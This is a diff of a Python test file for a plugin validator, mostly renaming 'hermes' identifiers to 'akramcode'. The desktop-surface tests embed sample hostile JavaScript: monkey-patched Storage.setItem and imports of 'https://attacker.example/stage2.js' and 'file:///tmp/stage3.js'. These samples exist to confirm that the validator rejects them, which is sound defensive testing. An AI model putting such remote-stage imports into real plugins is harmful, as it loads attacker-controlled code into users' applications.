@@ -1,4 +1,4 @@
-"""Tests for ``hermes plugins validate`` (akramcode_cli/plugin_validate.py).
+"""Tests for ``akramcode plugins validate`` (akramcode_cli/plugin_validate.py).
 
 Static manifest checks + subprocess-isolated capability probing against a
 recording stub context.
@@ -9,7 +9,7 @@ from __future__ import annotations
 import json
 from pathlib import Path
 
-import akram_core.hermes_yaml as yaml
+import akram_core.akramcode_yaml as yaml
 
 from akramcode_cli.plugin_validate import validate_plugin_dir
 from akramcode_cli.plugin_validate_desktop import desktop_surface_hits, is_desktop_surface
@@ -35,7 +35,7 @@ def _portable_plugin(root: Path, servers: dict, declarations: dict) -> Path:
     (root / "plugin.json").write_text(json.dumps({
         "$schema": PLUGIN_SCHEMA_V1,
         "name": "example-plugin",
-        "extensions": {"com.nousresearch.hermes": {"servers": declarations}},
+        "extensions": {"com.nousresearch.akramcode": {"servers": declarations}},
     }), encoding="utf-8")
     (root / "mcp.json").write_text(json.dumps({
         "$schema": MCP_SCHEMA_V1,
@@ -77,15 +77,15 @@ BASE_MANIFEST = {
 }
 
 
-def test_requires_hermes_spec_is_validated(tmp_path):
-    manifest = dict(BASE_MANIFEST, description="café", requires_hermes=">=0.21")
+def test_requires_akramcode_spec_is_validated(tmp_path):
+    manifest = dict(BASE_MANIFEST, description="café", requires_akramcode=">=0.21")
     d = _make_plugin(tmp_path, manifest=manifest)
     (d / "plugin.yaml").write_text(yaml.safe_dump(manifest), encoding="utf-8-sig")
 
     report = validate_plugin_dir(d)
 
     assert report.ok, report.failures
-    assert any(name == "requires_hermes" and ok for name, ok, _ in report.checks)
+    assert any(name == "requires_akramcode" and ok for name, ok, _ in report.checks)
 
 
 def test_config_schema_admits_every_type_the_loader_and_renderer_accept(tmp_path):
@@ -253,17 +253,17 @@ class TestModelProviderKind:
         assert any("registered no ProviderProfile" in f for f in report.failures), report.failures
 
 
-class TestRequiresHermesSpec:
-    """A typo'd ``requires_hermes`` clause must fail admission, not silently gate nothing."""
+class TestRequiresAkramCodeSpec:
+    """A typo'd ``requires_akramcode`` clause must fail admission, not silently gate nothing."""
 
     def test_typoed_clause_fails_admission(self, tmp_path):
         d = _make_plugin(
-            tmp_path, manifest={**BASE_MANIFEST, "requires_hermes": ">=0.21.1,<0.x"}
+            tmp_path, manifest={**BASE_MANIFEST, "requires_akramcode": ">=0.21.1,<0.x"}
         )
         report = validate_plugin_dir(d)
         assert not report.ok
         assert any(
-            "requires_hermes" in f and "does not parse" in f for f in report.failures
+            "requires_akramcode" in f and "does not parse" in f for f in report.failures
         ), report.failures
 
 
@@ -280,7 +280,7 @@ class TestDesktopSurface:
 
     def test_sdk_only_plugin_passes(self, tmp_path):
         d = self._desktop_plugin(tmp_path, (
-            "import { definePlugin } from '@hermes/plugin-sdk'\n"
+            "import { definePlugin } from '@akramcode/plugin-sdk'\n"
             "// Storage.prototype.setItem = noop  (comments are not code)\n"
             "export default definePlugin({ id: 'desk', register(ctx) { ctx.storage.set('k', 1) } })\n"
         ))
@@ -315,7 +315,7 @@ class TestDesktopSurface:
             "const raw = Storage.prototype.setItem\n"
             "Storage.prototype.setItem = function (k, v) { return raw.call(this, k, v) }\n"
             "const mod = await import(/* @vite-ignore */ new URL('./chunk.js', base).href)\n"
-            "const sdk = await import('@hermes/plugin-sdk')\n"
+            "const sdk = await import('@akramcode/plugin-sdk')\n"
         ))
         report = validate_plugin_dir(d)
         failed = {name: detail for name, ok, detail in report.checks if not ok}
@@ -355,7 +355,7 @@ class TestDesktopSurface:
         loader refuses URL-scheme specifiers, so admission must too. SDK/react imports stay clean."""
         d = self._desktop_plugin(
             tmp_path,
-            "import { host } from '@hermes/plugin-sdk'\n"
+            "import { host } from '@akramcode/plugin-sdk'\n"
             "import React from \"react\"\n"
             "import 'https://attacker.example/stage2.js'\n"
             "import stage from \"file:///tmp/stage3.js\"\n"
